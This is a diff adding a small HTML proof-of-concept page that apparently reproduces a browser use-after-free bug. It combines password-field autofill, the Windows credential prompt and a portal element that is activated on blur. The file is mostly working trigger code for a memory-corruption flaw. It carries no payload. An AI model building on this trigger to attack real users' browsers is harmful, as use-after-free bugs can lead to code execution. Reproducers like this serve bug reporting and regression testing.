@@ -1,0 +1,30 @@
+<div id="div">Use autofilling to fill the password field, the UAF will occur after closing the Windows credential UI prompt</div>
+<br>
+<form id="form">
+  <label class="input-placeholder"></label>
+  <input id="passwdfield" type="password" name="pwd" autocomplete="new-password" aria-autocomplete="list"/>
+</form>
+<script>
+  function test() {
+    var params = new URLSearchParams(window.location.search);
+    if(params.has("flag")) {
+      document.getElementById("form").style.display="none";
+      document.getElementById("div").style.display="none";
+      return;
+    }
+    var passwd_node = document.getElementById("passwdfield")
+    portal = document.createElement('portal');
+    portal.src = 'http://localhost:8000/poc.html?flag=1';
+    document.body.appendChild(portal);
+
+    passwd_node.addEventListener('click', async (evt) => {
+      passwd_node.addEventListener('blur', async (evt) => {
+        setTimeout(() => {
+          portal.activate();
+        }, 100);
+      })
+    })
+  }
+
+  window.onload = test;
+</script>
